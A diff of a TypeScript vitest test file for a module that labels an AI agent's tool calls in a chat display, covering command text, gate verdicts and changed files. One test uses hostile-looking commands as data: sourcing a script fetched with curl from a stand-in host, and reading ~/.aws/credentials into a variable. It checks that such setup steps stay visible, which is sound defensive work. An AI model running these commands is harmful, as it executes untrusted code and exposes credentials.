@@ -13,8 +13,8 @@
 import { describe, it, expect } from 'vitest';
 import type { ContentBlock } from '../../types';
 import {
-  deriveTurnView, stepLabel, extractNextSteps, isLandmarkText, summarizeProcess, groupSteps, thoughtTail,
-  changedFiles, sectionUnits, stageHeadline, stripKind,
+  deriveTurnView, stepLabel, extractNextSteps, isLandmarkText, isGateBlock, groupSteps, thoughtTail,
+  changedFiles, sectionUnits, stageHeadline, toolCall,
 } from './turnView';
 import type { ToolUseContent } from '../../types';
 
@@ -187,6 +187,12 @@ describe('deriveTurnView — landmarks, interrupts, live states, failures', () =
     expect(tooLate.units.some((u) => u.kind === 'thought' && u.intent)).toBe(false);
   });
 
+  it('a turn that starts with a tool result (compacted / resumed tail) has no intent', () => {
+    const th = (t: string) => ({ type: 'thinking', thinking: t }) as ContentBlock;
+    const v = deriveTurnView([tr('z'), th(`I'll inline a fallback expression here. ${'x'.repeat(170)}`), tu('a', 'Running: ls'), tx('done')], false);
+    expect(v.units.some((u) => u.kind === 'thought' && u.intent)).toBe(false);
+  });
+
   it('a note written between tools sits between the segments; the NEXT segment is live', () => {
     const view = deriveTurnView([tu('a', 'Running: ls'), tx('checking the config next'), tu('b', 'Reading /r/c.json', 'Read', 'read')], true);
     expect(view.units.map((u) => u.kind)).toEqual(['process', 'note', 'process']);
@@ -231,9 +237,9 @@ describe('stepLabel — backend summary string → verb + object (AC5)', () => {
     ['Running: cd /a/b; sed -n 1,200p backend/core/tool_summarizer.py', 'read', 'tool_summarizer.py'],
     ['Running: cat components/ContentBlockRenderer.tsx | sed -n 1,306p', 'read', 'ContentBlockRenderer.tsx'],
     ['Running: ls -la desktop/src/pages/chat/components', 'list', 'components'],
-    ['Running: cd /a/b && git log --oneline -5 -- desktop/', 'run', 'git log'],
+    ['Running: cd /a/b && git log --oneline -5 -- desktop/', 'run', 'git log --oneline'],
     ["Running: perl -e 'alarm 90; exec @ARGV' python3 -I /tmp/x/turns.py", 'run', 'turns.py'],
-    ['Running: export FOO=1; npx vitest run src/a.test.ts', 'run', 'npx vitest'],
+    ['Running: export FOO=1; npx vitest run src/a.test.ts', 'run', 'npx vitest run'],
   ])('bash %s → %s %s', (summary, verb, object) => {
     const l = lab(summary);
     expect(l.verb).toBe(verb);
@@ -343,24 +349,6 @@ describe('deriveTurnView — next steps + copy text', () => {
   });
 });
 
-describe('summarizeProcess — the collapsed-row facts', () => {
-  it('counts tool steps, failures and the top verbs (thinking is not a step)', () => {
-    const view = deriveTurnView([
-      tu('a', 'Reading /r/a.ts', 'Read', 'read'), tr('a'),
-      tu('b', 'Reading /r/b.ts', 'Read', 'read'), tr('b'),
-      tu('c', 'Running: grep -n x y.ts'), tr('c', true),
-      tu('d', 'Running: make test'), tr('d'),
-      tx('answer'),
-    ], false);
-    const p = view.units[0];
-    if (p.kind !== 'process') throw new Error('expected process');
-    const s = summarizeProcess(p);
-    expect(s.stepCount).toBe(4);
-    expect(s.errorCount).toBe(1);
-    expect(s.counts).toEqual([{ verb: 'read', count: 2 }, { verb: 'search', count: 1 }, { verb: 'run', count: 1 }]);
-  });
-});
-
 describe('isLandmarkText — no false landmarks from ordinary words (REVIEW fix)', () => {
   it.each(['aggregate 1 more result', 'delegate 2 tasks', 'investigate 0 errors', 'the gate 1 check passed'])(
     '%s is NOT a landmark', (t) => expect(isLandmarkText(t)).toBe(false));
@@ -391,10 +379,10 @@ describe('stepLabel — real-world setup prefixes (Layer-4 replay found these)',
     ['Running: cd ~/.app/logs 2>/dev/null || cd ~/.app\nLOG=$(ls -t ~/.app/logs/b.log | head -1)', 'list', 'b.log'],
     ['Running: cd /a/b 2>/dev/null\nls -la 2>/dev/null', 'list', '.'],
     ['Running: cd /a/logs 2>/dev/null || cd $HOME/x/logs; pwd; ls -la', 'list', '.'],
-    ['Running: cd /a/p 2>/dev/null && git log --oneline -5 2>/dev/null', 'run', 'git log'],
+    ['Running: cd /a/p 2>/dev/null && git log --oneline -5 2>/dev/null', 'run', 'git log --oneline'],
     ['Running: cd /a/repo || exit\ngrep -n "needs_review" core/x.py', 'search', '"needs_review"'],
     ['Running: cd ~/.c/projects 2>/dev/null || { echo "none"; exit 0; }\nls -d *ws*', 'list', '*ws*'],
-    ['Running: export PATH="/a/node/bin:$PATH"\nsource /a/repo/.venv/bin/activate\nnpx vitest run x', 'run', 'npx vitest'],
+    ['Running: export PATH="/a/node/bin:$PATH"\nsource /a/repo/.venv/bin/activate\nnpx vitest run x', 'run', 'npx vitest run'],
     ['Running: cd /Users/someone/Deskt', 'run', '…'],
   ])('%s', (summary, verb, object) => {
     const l = lab(summary);
@@ -517,24 +505,20 @@ describe('stepLabel — a Bash step is relabelled only when ALL of it only reads
   });
   it.each([
     'grep -l foo src | xargs rm',
-    'cat a.ts > b.ts',
-    'echo hi >> notes.md',
     'sed -i s/a/b/ f.ts',
     'find . -name "*.tmp" -delete',
     'sort -o out.txt in.txt',
     'cat $(ls -t logs | head -1)',
-  ])('%s → never a read, and never the command itself (v7.11)', (cmd) => {
+  ])('%s → Run with the command itself', (cmd) => {
     const l = label(cmd);
-    expect(['read', 'search', 'list']).not.toContain(l.verb);
-    expect(l.object).not.toBe(cmd);
-    expect(l.object.length).toBeLessThanOrEqual(24);
+    expect(l.verb).toBe('run');
+    expect(l.object).toBe(cmd.length > 60 ? `${cmd.slice(0, 57)}…` : cmd);
   });
   it.each([
-    ['cat a.ts > b.ts', 'edit', 'b.ts'],
-    ['echo hi >> notes.md', 'edit', 'notes.md'],
-    ['grep -l foo src | xargs rm', 'run', 'grep'],
-  ])('%s → %s %s', (cmd, verb, object) => {
-    expect(label(cmd)).toMatchObject({ verb, object });
+    ['cat a.ts > b.ts', 'b.ts'],
+    ['echo hi >> notes.md', 'notes.md'],
+  ])('%s writes a file: an edit of %s (counted as changed)', (cmd, object) => {
+    expect(label(cmd)).toMatchObject({ verb: 'edit', object });
   });
   it('a script behind a writing pipeline keeps its short name', () => {
     expect(label('python3 scripts/x.py --run > out.log')).toMatchObject({ verb: 'run', object: 'x.py' });
@@ -560,7 +544,7 @@ describe('groupSteps — adjacent reads of one file are one row', () => {
     const v = deriveTurnView([rd('a'), tr('a'), th, rd('b'), tr('b'), tx('x')], false);
     expect(v.units.map((u) => u.kind)).toEqual(['process', 'thought', 'process', 'outcome']);
     const p = v.units[0];
-    expect(p.kind === 'process' && summarizeProcess(p).stepCount).toBe(1);
+    expect(p.kind === 'process' && p.steps.filter((x) => x.kind === 'tool').length).toBe(1);
   });
 });
 
@@ -581,7 +565,7 @@ describe('deriveTurnView — sub-agent steps nest under their Agent step', () =>
     if (a.kind !== 'tool') throw new Error('expected tool');
     expect(a.children?.map((c) => [c.block.id, c.status, c.result?.outcome])).toEqual([
       ['s1', 'done', 'lines 1–9'], ['s2', 'done', undefined]]);
-    expect(summarizeProcess(p).stepCount).toBe(1);
+    expect(p.steps.filter((x) => x.kind === 'tool').length).toBe(1);
   });
 
   it('children share a running or cut-off Agent fate unless their own result came back', () => {
@@ -670,64 +654,150 @@ describe('v7.1 — what changed, stage sections, clickable Bash paths', () => {
   });
 });
 
-describe('strip labels (chat display v7.11) — never a raw command', () => {
-  const lab = (summary: string, name = 'Bash') => stepLabel({ type: 'tool_use', id: 'x', name, summary } as ToolUseContent);
+describe('toolCall — the real tool and the real command (chat display v7.12)', () => {
+  const call = (summary: string, name = 'Bash') => toolCall({ type: 'tool_use', id: `x-${summary}`, name, summary } as ToolUseContent);
 
-  it('an inline python -c behind a bare assignment reads "inline script"', () => {
-    const l = lab('Running: R=run_df73d970; python3 -c " import json,os;r=json.load(open(p))"');
-    expect(l.object).toBe('inline script');
-    expect(stripKind({ type: 'tool_use', id: 'x', name: 'Bash', summary: 'Running: R=run_df73d970; python3 -c "x"' } as ToolUseContent, l)).toBe('run');
+  it.each([
+    ['Running: cd /Users/a/repo\ngit log -6 --format=%h', 'git log -6 --format=%h'],
+    ["Running: cd /r && perl -e 'alarm 120; exec @ARGV' backend/.venv/bin/python backend/scripts/x.py --mode verify", 'backend/.venv/bin/python backend/scripts/x.py --mode verify'],
+    ['Running: export FOO=1; npx vitest run src/a.test.ts', 'npx vitest run src/a.test.ts'],
+    ['Running: timeout 30 curl -s localhost:18321/health', 'curl -s localhost:18321/health'],
+    ['Running: R=run_x; python3 -c "import json"', 'R=run_x; python3 -c "import json"'],
+    ["Running: cat > /tmp/x/c1.py <<'PYEOF'", "cat > /tmp/x/c1.py <<'PYEOF'"],
+  ])('Bash %s → the command itself, setup and wrapper stripped', (summary, text) => {
+    const c = call(summary);
+    expect(c.tool).toBe('Bash');
+    expect(c.text).toBe(text);
   });
 
-  it('a test-runner command is a Test strip without the command text', () => {
-    const summary = "Running: R=run_x; uptime; perl -e 'alarm 200; exec @ARGV' backend/.venv/bin/python backend/scripts/pipeline_test.py --project SwarmAI";
-    const l = lab(summary);
-    expect(l.object).not.toMatch(/R=|perl|alarm|uptime/);
-    expect(stripKind({ type: 'tool_use', id: 'x', name: 'Bash', summary } as ToolUseContent, l)).toBe('test');
+  it('never a translated object: no "inline script", no bare program name', () => {
+    expect(call('Running: python3 -c "print(1)"').text).toBe('python3 -c "print(1)"');
+    expect(call('Running: rsync -av src/ dst/').text).toBe('rsync -av src/ dst/');
   });
 
-  it('an unknown writing command shows only the program name', () => {
-    expect(lab('Running: rsync -av --delete src/ dst/backup-2026-10-18/').object).toBe('rsync');
+  it('a summary cut inside its setup shows an ellipsis, not the setup', () => {
+    expect(call('Running: cd /Users/someone/Deskt').text).toBe('…');
   });
 
-  it('git shows the program and its subcommand, no flags', () => {
-    const summary = 'Running: cd /r && git diff -U0 HEAD -- a.ts';
-    const l = lab(summary);
-    expect(l.object).toBe('git diff');
-    expect(stripKind({ type: 'tool_use', id: 'x', name: 'Bash', summary } as ToolUseContent, l)).toBe('git');
+  it('file tools: the real tool name and the path (home shown as ~), linked', () => {
+    const c = call('Reading /Users/gawan/r/src/a.ts', 'Read');
+    expect(c).toEqual({ tool: 'Read', text: '~/r/src/a.ts', path: '/Users/gawan/r/src/a.ts' });
+    expect(call('Writing to /abs/b.md', 'Write').tool).toBe('Write');
   });
 
-  it('a heredoc write names the file it writes, as a Write strip', () => {
-    const summary = "Running: cat > /tmp/run/scripts/c1.py <<'PYEOF'";
-    const l = lab(summary);
-    expect(l.object).toBe('c1.py');
-    expect(stripKind({ type: 'tool_use', id: 'x', name: 'Bash', summary } as ToolUseContent, l)).toBe('write');
+  it('other tools keep their own name and argument text', () => {
+    expect(call('Agent: Gate-2 correctness', 'Agent')).toEqual({ tool: 'Agent', text: 'Gate-2 correctness' });
+    expect(call('Agent (Explore): find the store', 'Agent').text).toBe('find the store');
+    expect(call('MCP: builder search', 'mcp__builder__search')).toEqual({ tool: 'mcp__builder__search', text: 'builder search' });
   });
 
-  it('a read-only command with no file shows the program, not its arguments', () => {
-    expect(lab("Running: jq '.stages[] | .status' run.json").object).not.toMatch(/stages|status/);
+  it('every tool_summarizer form loses only the summarizer\'s own words', () => {
+    expect(call('Searching web for vite 7 release', 'WebSearch').text).toBe('vite 7 release');
+    expect(call('Searching for "needs_review"', 'Grep').text).toBe('"needs_review"');
+    expect(call('Fetching https://a.dev/x', 'WebFetch').text).toBe('https://a.dev/x');
+    expect(call('Loading tools: a, b', 'ToolSearch').text).toBe('a, b');
+    expect(call('Using skill: s_x', 'Skill').text).toBe('s_x');
+    expect(call('Writing 3 todos', 'TodoWrite').text).toBe('3 todos');
+    expect(call('NotebookEdit: cell 3', 'NotebookEdit').text).toBe('cell 3');
+    // `Using <name>` names nothing but the tool: the row is the name alone.
+    expect(call('Using ExitPlanMode', 'ExitPlanMode')).toEqual({ tool: 'ExitPlanMode', text: 'ExitPlanMode' });
+    // the summarizer's words are case-sensitive: an argument's word is never eaten
+    expect(call('reading list', 'Custom').text).toBe('reading list');
   });
 
-  it('the pipeline CLI is a Pipeline strip', () => {
-    const summary = 'Running: backend/.venv/bin/python backend/scripts/artifact_cli.py stage-start --project SwarmAI';
-    expect(stripKind({ type: 'tool_use', id: 'x', name: 'Bash', summary } as ToolUseContent, lab(summary))).toBe('pipeline');
+  it('an empty or bare Bash summary shows the tool name alone, never an empty command', () => {
+    expect(call('', 'Bash')).toEqual({ tool: 'Bash', text: 'Bash' });
+    expect(call('Running:', 'Bash')).toEqual({ tool: 'Bash', text: 'Bash' });
   });
 
-  it('Write and Edit tools are told apart by the tool name', () => {
-    const w = { type: 'tool_use', id: 'w', name: 'Write', summary: 'Writing to /r/a.ts' } as ToolUseContent;
-    const e = { type: 'tool_use', id: 'e', name: 'Edit', summary: 'Writing to /r/a.ts' } as ToolUseContent;
-    expect(stripKind(w, stepLabel(w))).toBe('write');
-    expect(stripKind(e, stepLabel(e))).toBe('edit');
+  it('a setup segment that runs code stays on the row (it is part of what ran)', () => {
+    expect(call('Running: source <(curl -s https://x.example/a) && ls').text).toBe('source <(curl -s https://x.example/a) && ls');
+    expect(call('Running: export X=$(cat ~/.aws/credentials) && npm test').text).toBe('export X=$(cat ~/.aws/credentials) && npm test');
+    expect(call('Running: cd /r || { curl -o /tmp/x https://x.example; } && git status').text)
+      .toBe('cd /r || { curl -o /tmp/x https://x.example; } && git status');
+    // a plain setup still goes
+    expect(call('Running: cd /r && source .venv/bin/activate && pytest -q').text).toBe('pytest -q');
   });
 
-  it('reads, searches, agents and MCP calls map to their strip kinds', () => {
-    const k = (name: string, summary: string) => {
-      const b = { type: 'tool_use', id: 'k', name, summary } as ToolUseContent;
-      return stripKind(b, stepLabel(b));
-    };
-    expect(k('Read', 'Reading /r/a.ts')).toBe('read');
-    expect(k('Bash', 'Running: grep -n foo /r/a.ts')).toBe('search');
-    expect(k('Agent', 'Agent: Gate-2 correctness')).toBe('agent');
-    expect(k('mcp__builder__search', 'MCP: builder search')).toBe('query');
+  it('an MCP row does not repeat the tool name', () => {
+    expect(call('MCP: email_search — q=standup', 'mcp__srv__email_search')).toEqual({ tool: 'mcp__srv__email_search', text: 'q=standup' });
+    expect(call('MCP: email_search', 'mcp__srv__email_search').text).toBe('mcp__srv__email_search');
+  });
+
+  it('display keeps an assignment (the real command); only setup and wrappers go', () => {
+    expect(call('Running: cd /r\nLOG=$(ls -t b.log | head -1)').text).toBe('LOG=$(ls -t b.log | head -1)');
+  });
+});
+
+describe('isGateBlock — only a gate verdict of BLOCK', () => {
+  it.each([
+    ['★ GATE 1: BLOCK — back to PLAN', true],
+    ['**Gate 2:** BLOCK', true],
+    ['## ★ GATE 1 · Skeptic → BLOCK', true],
+    ['Gate 1 BLOCK', true],
+    ['gate 0: block', true],
+    ['Gate 1：BLOCK', true],
+    ['GATE 1 判定：BLOCK', true],
+    ['Gate 1 · BLOCK', true],
+    ['Gate 1 ⛔ BLOCK', true],
+    ['Gate 1 → PASS; Skeptic: BLOCK resolved', false],
+    ['Gate 1 → 0 BLOCK', false],
+    ['Gate 1 non-blocking note', false],
+    ['★ GATE 0 PASS · 0 BLOCK', false],
+    ['Gate 2 → PASS (2 BLOCK findings fixed)', false],
+    ['## ✦ ⑦ TEST\n→ BLOCK list unchanged', false],
+  ])('%s → %s', (text, blocks) => {
+    expect(isGateBlock(text)).toBe(blocks);
+  });
+
+  it('the module has no regex lookbehind (the macOS 10.15 webview cannot parse one)', async () => {
+    const { readFileSync } = await import('fs');
+    const { join, dirname } = await import('path');
+    const { fileURLToPath } = await import('url');
+    const src = readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'turnView.ts'), 'utf-8');
+    expect(src).not.toMatch(/\(\?<[!=]/);
+  });
+
+  it('a PASS gate with a zero BLOCK count keeps the running stage', () => {
+    const st = { type: 'pipeline_stage', runId: 'r', stage: 'plan', status: 'completed', ordinal: 3, position: 3, total: 8,
+      profile: 'full', next: 'build', nextOrdinal: 4, gate: null, summary: 'ok', at: 'T' } as ContentBlock;
+    const v = deriveTurnView([tu('a', 'Running: ls'), tr('a'), st, tx('★ GATE 1 PASS · 0 BLOCK'), tu('b', 'Running: make')], true);
+    expect(v.liveStage?.stage).toBe('build');
+  });
+});
+
+describe('midWork — a compacted / resumed tail', () => {
+  it('is on the view; such a turn has no intent thought', () => {
+    const tail = deriveTurnView([tr('a'), { type: 'thinking', thinking: 'continuing the fix' } as ContentBlock, tu('b', 'Running: ls'), tx('done')], false);
+    expect(tail.midWork).toBe(true);
+    expect(tail.units.some((u) => u.kind === 'thought' && u.intent)).toBe(false);
+    expect(deriveTurnView([tu('b', 'Running: ls'), tx('done')], false).midWork).toBe(false);
+  });
+});
+
+describe('the running stage row survives the pipeline\'s own stage landmark', () => {
+  const st = (stage: string, next: string | null): ContentBlock => ({
+    type: 'pipeline_stage', runId: 'r', stage, status: 'completed', ordinal: 7, position: 6, total: 8, profile: 'full',
+    next, nextOrdinal: 9, gate: null, summary: 'ok', at: '2026-10-18T00:00:00Z',
+  }) as ContentBlock;
+
+  it('"✦ ⑦ TEST" after the TEST row keeps DELIVER as the running stage', () => {
+    const v = deriveTurnView([tu('a', 'Running: ls'), tr('a'), st('test', 'deliver'), tx('## ✦ ⑦ TEST\n→ 137 passed'), tu('b', 'Running: make')], true);
+    expect(v.liveStage?.stage).toBe('deliver');
+  });
+
+  it('a Gate BLOCK after the row still hides it (the run goes back a stage)', () => {
+    const v = deriveTurnView([tu('a', 'Running: ls'), tr('a'), st('plan', 'build'), tx('★ GATE 1: BLOCK — back to PLAN'), tu('b', 'Running: make')], true);
+    expect(v.liveStage).toBeUndefined();
+  });
+});
+
+describe('a Bash write-only command counts as a changed file', () => {
+  it('cat > file <<EOF and tee file are edits of that file', () => {
+    const w = (summary: string) => stepLabel({ type: 'tool_use', id: `w-${summary}`, name: 'Bash', summary } as ToolUseContent);
+    expect(w("Running: cat > /tmp/x/c1.py <<'PYEOF'")).toMatchObject({ verb: 'edit', object: 'c1.py', path: '/tmp/x/c1.py' });
+    expect(w('Running: tee /tmp/x/a.md').verb).toBe('edit');
+    // an assignment in front does not hide the write
+    expect(w('Running: R=run_x; cat > /tmp/x/c2.py <<EOF')).toMatchObject({ verb: 'edit', object: 'c2.py' });
   });
 });
